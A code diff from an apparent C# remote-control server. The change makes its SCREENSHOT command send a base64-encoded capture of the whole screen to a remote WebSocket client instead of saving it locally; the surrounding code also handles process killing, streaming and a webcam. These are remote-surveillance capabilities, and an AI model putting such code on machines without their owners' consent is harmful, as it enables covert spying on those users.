@@ -255,7 +255,10 @@ namespace Server
 
                 else if (msg == "SCREENSHOT")
                 {
-                    CaptureScreen();
+                    byte[] img = CaptureScreenBytes();
+                    string b64 = Convert.ToBase64String(img);
+
+                    await SendText(ws, "SCREENSHOT|" + b64);
                 }
                 else if (msg.StartsWith("KILL|"))
                 {
@@ -453,7 +456,9 @@ namespace Server
 
             Console.WriteLine("Streaming loop ended.");
         }
-
+        // ======================================================
+        // ===================== SNAP ===========================
+        // ======================================================
         static byte[] CaptureScreenBytes()
         {
             Rectangle bounds = SystemInformation.VirtualScreen;
@@ -549,36 +554,7 @@ namespace Server
             return sb.ToString();
         }
 
-        // ======================================================
-        // =================== SNAP ===========================
-        // ======================================================
-        public static void CaptureScreen()
-        {
-            Thread t = new Thread(() =>
-            {
-                Rectangle bounds = SystemInformation.VirtualScreen;
-                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
-                using (Graphics g = Graphics.FromImage(bmp))
-                {
-                    g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
-                    using (SaveFileDialog save = new SaveFileDialog())
-                    {
-                        save.Filter = "PNG Files (*.png)|*.png|JPEG Files (*.jpg)|*.jpg";
-                        save.FilterIndex = 1;
-                        if (save.ShowDialog() == DialogResult.OK)
-                        {
-                            var format = save.FilterIndex == 1 ?
-                                          System.Drawing.Imaging.ImageFormat.Png :
-                                          System.Drawing.Imaging.ImageFormat.Jpeg;
-                            bmp.Save(save.FileName, format);
-                            MessageBox.Show("Ảnh đã được lưu tại: " + save.FileName);
-                        }
-                    }
-                }
-            });
-            t.SetApartmentState(ApartmentState.STA);
-            t.Start();
-        }
+
         // ======================================================
         // =================== WEBCAM ===========================
         // ======================================================
